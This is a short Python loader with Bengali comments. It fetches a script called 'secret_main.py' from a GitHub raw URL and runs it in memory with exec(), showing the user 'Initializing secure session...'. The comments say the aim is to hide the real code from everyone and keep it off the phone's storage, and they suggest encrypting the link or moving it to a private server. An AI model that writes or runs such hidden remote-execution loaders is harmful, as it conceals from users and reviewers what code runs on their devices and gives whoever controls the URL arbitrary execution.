import urllib.request
import sys

# এটি হলো আপনার সিক্রেট বা মেইন কোডের র লিংক (যেটি আপনি সবার কাছ থেকে লুকিয়ে রাখতে চান)
# আপনি চাইলে এই লিংকটি এনক্রিপ্ট বা কোনো প্রাইভেট সার্ভারেও রাখতে পারেন
SECRET_MAIN_URL = 'https://raw.githubusercontent.com/tcp-bot-ctrl/faysal/refs/heads/main/secret_main.py'

try:
  print("Initializing secure session...")
  # ইন্টারনেট থেকে রেমের ভেতরে মেইন কোড ফেচ করে রান করা (ফাইল ফোনে সেভ হবে না)
  response = urllib.request.urlopen(SECRET_MAIN_URL)
  main_code = response.read().decode('utf-8')
  
  # রেমের ভেতর এক্সিকিউট করা
  exec(main_code)
except Exception as e:
  print(f"Failed to start: {e}")
